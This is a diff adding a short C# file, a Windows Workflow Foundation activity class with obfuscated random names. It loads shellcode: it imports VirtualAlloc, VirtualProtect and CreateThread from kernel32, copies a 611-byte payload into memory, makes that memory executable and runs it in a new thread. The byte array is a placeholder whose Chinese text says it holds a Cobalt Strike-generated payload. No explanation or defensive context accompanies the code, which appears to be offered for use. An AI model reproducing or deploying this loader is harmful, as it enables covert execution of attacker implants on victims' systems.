@@ -1,0 +1,29 @@
+      using System;
+      using System.Workflow.Activities;
+      using System.Runtime.InteropServices;
+
+      class rZuBPikIPTa : SequentialWorkflowActivity {
+
+      [DllImport("kernel32")] private static extern IntPtr VirtualAlloc (UInt32 upAnvvQ, UInt32 AFXnREsTQzEOAAd, UInt32 IpbjEgagVjmXYQY, UInt32 cuSzCVNS );
+
+      [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr YBnTrPm, uint BawvoQQIpGCxl, uint VGBNMO, out uint BsntUAj);
+
+      [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 txTgrzfHNkQoc, UInt32 RKMQDMs, IntPtr sJrpCENpa ,IntPtr OrwoVQq, UInt32 WrjXYm, ref UInt32 cyVBsQzqtsqkUF);
+
+      [DllImport ("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr PeuRGApcRuv, UInt32 SRVbLtVKdcWH);
+      public rZuBPikIPTa() {
+
+      byte[] ZsNzgj = new byte[611] { cobaltstrike生成的payload };
+
+      IntPtr QVcVIdzGww = VirtualAlloc(0, (UInt32)ZsNzgj. Length, 0x3000, 0x04);
+      Marshal. Copy(ZsNzgj, 0, (IntPtr)(QVcVIdzGww), ZsNzgj.Length) ;
+
+      IntPtr DekpfAUd = IntPtr.Zero; 
+      UInt32 ojVrKGz = 0;
+      IntPtr ltbAozP = IntPtr.Zero;
+      uint ucoQVfoKDEnVZPa;
+
+      bool DzWtmyLyaEPoc = VirtualProtect(QVcVIdzGww, (uint)0x1000, (uint)0x20, out ucoQVfoKDEnVZPa);
+      DekpfAUd = CreateThread(0, 0, QVcVIdzGww, ltbAozP, 0, ref ojVrKGz);
+      WaitForSingleObject(DekpfAUd , 0xFFFFFFF);}
+}
